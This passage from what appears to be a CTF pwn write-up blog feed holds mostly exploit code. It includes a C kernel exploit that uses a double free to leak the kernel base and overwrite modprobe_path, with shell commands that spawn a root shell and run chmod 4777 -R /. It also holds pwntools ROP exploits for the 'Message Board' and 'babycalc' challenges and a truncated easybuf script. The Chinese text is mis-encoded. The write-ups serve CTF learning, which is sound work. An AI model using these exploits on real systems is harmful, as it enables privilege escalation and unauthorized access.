class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">uint64_t</span> kernel_base, modprobe_path;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">arg</span>&#123;</span><br>    u_int idx;<br>    u_int size;<br>    <span class="hljs-type">char</span> *buf;<br>&#125;parm;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">shmid_open</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> shmid;<br><span class="hljs-keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="hljs-number">100</span>,<span class="hljs-number">0600</span>))==<span class="hljs-number">-1</span>)<br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[X] Shmget Error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *shmaddr=shmat(shmid,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (shmaddr==(<span class="hljs-type">void</span>*)<span class="hljs-number">-1</span>)<br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[X] Shmat Error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">return</span> shmid;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,u_int idx,u_int size,<span class="hljs-type">char</span> *buf)</span>&#123;<br>    parm note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0xDEADBEEF</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">int</span> idx)</span>&#123;<br>    parm note = &#123;<br>        .idx=idx,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0xC0DECAFE</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hexdump</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(size/<span class="hljs-number">8</span>);i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[96m\e[1m[+%02x]:\t0x%016llx\e[0m\n&quot;</span>, i*<span class="hljs-number">8</span>, *(<span class="hljs-type">size_t</span> *)(buf + i*<span class="hljs-number">8</span>));<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leak_kernel_base</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> *buf=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>    <span class="hljs-type">uint64_t</span> *recv_msg=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>    <span class="hljs-type">int</span> qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg</span> *<span class="hljs-title">message</span>=</span>(<span class="hljs-keyword">struct</span> msg*)buf;<br>    <span class="hljs-type">int</span> size=<span class="hljs-number">0x1018</span>;<br><br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x2000</span>);<br><br>    add(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,buf);<br>    del(fd,<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x2000</span>);<br>    qid=msgget(IPC_PRIVATE,<span class="hljs-number">0666</span>|IPC_CREAT);<br>    msgsnd(qid,message,size<span class="hljs-number">-0x30</span>,<span class="hljs-number">0</span>);<br>    del(fd,<span class="hljs-number">0</span>);<span class="hljs-comment">//doublefree</span><br>    shmid_open();<br>    msgrcv(qid,(<span class="hljs-type">char</span>*)recv_msg,size,<span class="hljs-number">0</span>,IPC_NOWAIT|MSG_NOERROR);<br>    Hexdump(recv_msg,<span class="hljs-number">0x200</span>*<span class="hljs-number">8</span>);<br>    kernel_base = recv_msg[<span class="hljs-number">0x1fb</span>] - <span class="hljs-number">0x19ac6c0</span>;<br>    modprobe_path = kernel_base + <span class="hljs-number">0x18510a0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel_base = 0x%lx\n&quot;</span>, kernel_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] modprobe_path = 0x%lx\n&quot;</span>, modprobe_path);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hijack_modprobe</span><span class="hljs-params">()</span><br>&#123;<br>system(<span class="hljs-string">&quot;echo -ne &#x27;#!/bin/sh\nsetsid cttyhack setuidgid 0 /bin/sh\nchmod 4777 -R /\n&#x27; &gt; /tmp/u&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/u&quot;</span>);<br>system(<span class="hljs-string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/qyq&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/qyq&quot;</span>);<br>system(<span class="hljs-string">&quot;/tmp/qyq&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">AAW</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">uint64_t</span> *buf=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>);<br>    add(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,buf);<br>    del(fd,<span class="hljs-number">0</span>);<br>    del(fd,<span class="hljs-number">0</span>);<br>    buf[<span class="hljs-number">0x2</span>] =modprobe_path;<br>    add(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,buf);<br>    add(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,buf);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">strcpy</span>(buf,<span class="hljs-string">&quot;/tmp/u&quot;</span>);<br><br>    add(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,buf);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    fd=open(<span class="hljs-string">&quot;/dev/rwctf&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)&#123;<br>        errExit(<span class="hljs-string">&quot;[X]fd open&quot;</span>);<br>    &#125;<br>    leak_kernel_base();<br>    AAW();<br>    hijack_modprobe();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2-1684595083712.png" alt="2"></p><h4 id="0x5å‚è€ƒ">0x5å‚è€ƒ</h4><p><a href="https://kagehutatsu.com/?p=778">2023 RealworldCTF ä½“éªŒèµ› éƒ¨åˆ†WP-Pwnå½±äºŒã¤çš„åšå®¢ (kagehutatsu.com)</a></p><p><a href="https://kagehutatsu.com/?p=526">https://kagehutatsu.com/?p=526</a></p>]]></content>
    
    
    <categories>
      
      <category>kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023è¥¿æ¹–è®ºå‰‘çº¿ä¸Šèµ›pwn</title>
    <link href="/2023/02/02/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86pwn/"/>
    <url>/2023/02/02/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>æœ‰äº›é¢˜å¤ªéš¾äº†ï¼Œæ˜¯å®Œå…¨ä¸ä¼šã€‚</p><h2 id="Message-Board">Message Board</h2><p>æ¼æ´æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²,0x10çš„æ ˆæº¢å‡º</p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²æ ˆå’Œlibcï¼Œæ ˆè¿ç§»åˆ°å‰é¢æ‰§è¡Œå¸ƒç½®çš„ropå»orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">23492</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&#x27;name:&#x27;</span>,<span class="hljs-string">&#x27;%p,%22$p&#x27;</span>)<br><br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>stack=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>info(<span class="hljs-string">&quot;stack&quot;</span>,stack)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x22c5e0</span><br>info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><br>leave_ret=<span class="hljs-number">0x00000000004012e1</span><br>pop_rdi=<span class="hljs-number">0x0000000000401413</span><br>pop_rsi=libc_base+<span class="hljs-number">0x000000000002601f</span><br>pop_rdx=libc_base+<span class="hljs-number">0x0000000000142c92</span><br><br>pd=<span class="hljs-string">b&quot;/flag\x00\x00\x00&quot;</span><br>pd+=flat(pop_rdi,stack+<span class="hljs-number">0x10</span>,pop_rsi,<span class="hljs-number">0</span>,libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>])<br>pd+=flat(pop_rdi,<span class="hljs-number">3</span>,pop_rsi,stack-<span class="hljs-number">0x100</span>,pop_rdx,<span class="hljs-number">0x40</span>,libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>])<br>pd+=flat(pop_rdi,<span class="hljs-number">1</span>,pop_rsi,stack-<span class="hljs-number">0x100</span>,pop_rdx,<span class="hljs-number">0x40</span>,libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>])<br>pd=pd.ljust(<span class="hljs-number">0xb0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pd+=p64(stack+<span class="hljs-number">0x10</span>)+p64(leave_ret)<br><span class="hljs-comment">#debug()</span><br>sa(<span class="hljs-string">&#x27;DASCTF:&#x27;</span>,pd)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="babycalc">babycalc</h2><p>è¦†ç›–æœ€åä¸€ä¸ªå˜é‡èƒ½å¾€æŒ‡å®šåç§»å†™å­—èŠ‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">int <span class="hljs-selector-tag">i</span>; // <span class="hljs-selector-attr">[rsp+FCh]</span> <span class="hljs-selector-attr">[rbp-4h]</span><br></code></pre></td></tr></table></figure><p>é…åˆè¿™ä¸ª</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-built_in">v0</span> = strtol(<span class="hljs-keyword">buf, </span><span class="hljs-number">0</span>LL, <span class="hljs-number">10</span>);<br>    *(&amp;v3 + i) = <span class="hljs-built_in">v0</span>;<br></code></pre></td></tr></table></figure><p>éƒ¨åˆ†æ”¹å†™retä¸ºleave_retï¼Œæ ˆè¿ç§»åˆ°å‰é¢ï¼Œä½†æ¯æ¬¡éƒ½è¿ç§»çš„ä½ç½®éƒ½ä¸å›ºå®šï¼Œç”¨retå……å½“æ»‘ç‰‡ï¼Œæ»‘åˆ°ropé“¾æ‰§è¡Œï¼Œåˆ†ä¸¤æ¬¡ï¼Œä¸€æ¬¡æ³„éœ²libc,ä¸€æ¬¡system(binsh)</p><p>è¿˜æœ‰ä¸ªoff by null?</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">buf</span>[(int)read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x100uLL)] = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>è¦returnçš„è¯è¦é€šè¿‡å‰é¢çš„ä¸€ä¸²è®¡ç®—ï¼Œç”¨z3åº“ç®—ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./babycalc&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">23281</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><br>puts_got=<span class="hljs-number">0x602018</span><br>pop_rdi=<span class="hljs-number">0x0000000000400ca3</span><br>main=<span class="hljs-number">0x400c1a</span><br>ret=<span class="hljs-number">0x400c19</span><br><br>v3 = <span class="hljs-number">19</span><br>v4 = <span class="hljs-number">36</span><br>v5 = <span class="hljs-number">53</span><br>v6 = <span class="hljs-number">70</span><br>v7 = <span class="hljs-number">55</span><br>v8 = <span class="hljs-number">66</span><br>v9 = <span class="hljs-number">17</span><br>v10 = <span class="hljs-number">161</span><br>v11 = <span class="hljs-number">50</span><br>v12 = <span class="hljs-number">131</span><br>v13 = <span class="hljs-number">212</span><br>v14 = <span class="hljs-number">101</span><br>v15 = <span class="hljs-number">118</span><br>v16 = <span class="hljs-number">199</span><br>v17 = <span class="hljs-number">24</span><br>v18 = <span class="hljs-number">3</span><br><br>payload=<span class="hljs-string">b&quot;24aaaaaa&quot;</span><br>payload+=p64(ret)*<span class="hljs-number">21</span><br>payload+=flat(pop_rdi,elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>],elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>],main+<span class="hljs-number">1</span>)<br>payload+=p8(v3)+p8(v4)+p8(v5)+p8(v6)+p8(v7)+p8(v8)+p8(v9)+p8(v10)+p8(v11)+p8(v12)+p8(v13)+p8(v14)+p8(v15)+p8(v16)+p8(v17)+p8(v18)<br>payload=payload.ljust(<span class="hljs-number">0xf8</span>+<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload+=p32(<span class="hljs-number">0x38</span>)<br><br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&quot;:&quot;</span>,payload)<br><br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&#x27;libc_base: &#x27;</span>,libc_base)<br>binsh=libc_base+libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload=<span class="hljs-string">b&quot;24aaaaaa&quot;</span><br>payload+=p64(ret)*<span class="hljs-number">21</span><br>payload+=flat(pop_rdi,binsh,system,main+<span class="hljs-number">1</span>)<br>payload+=p8(v3)+p8(v4)+p8(v5)+p8(v6)+p8(v7)+p8(v8)+p8(v9)+p8(v10)+p8(v11)+p8(v12)+p8(v13)+p8(v14)+p8(v15)+p8(v16)+p8(v17)+p8(v18)<br>payload=payload.ljust(<span class="hljs-number">0xf8</span>+<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload+=p32(<span class="hljs-number">0x38</span>)<br>sea(<span class="hljs-string">&quot;:&quot;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
      <tag>orw</tag>
      
      <tag>Stack migration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023å±±çŸ³å†¬ä»¤è¥pwn</title>
    <link href="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/"/>
    <url>/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>å±±çŸ³çš„å†¬ä»¤è¥ï¼Œæ”¾ä¸ª<a href="https://pan.baidu.com/s/1_NjENG8Vb2czIiFWFbiQZA?pwd=cy6y">é¢˜ç›®é™„ä»¶</a></p><h2 id="easybuf">easybuf</h2><p>æ•°ç»„è¶Šç•Œä»»æ„å†™ï¼ŒåŠ«æŒsleepä¸ºåé—¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./easybuf&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;10.10.30.13&#x27;</span>,<span class="hljs-number">30006</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br>backdoor=<span class="hljs-number">0x40125c</span><br>sleep=<span class="hljs-number">0x403598</span><br>sl(<span class="hljs-string">&quot;Y&quot;</span>)<br>sl(<span class="hljs-string">&#x27;-3&#x27;</span>)<br><span class="hljs-comment">#debug(&quot;b*strcpy&quot;)</span><br>sl(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">&#x27;\x5c\x12\x40&#x27;</span>)<br>sl(<span 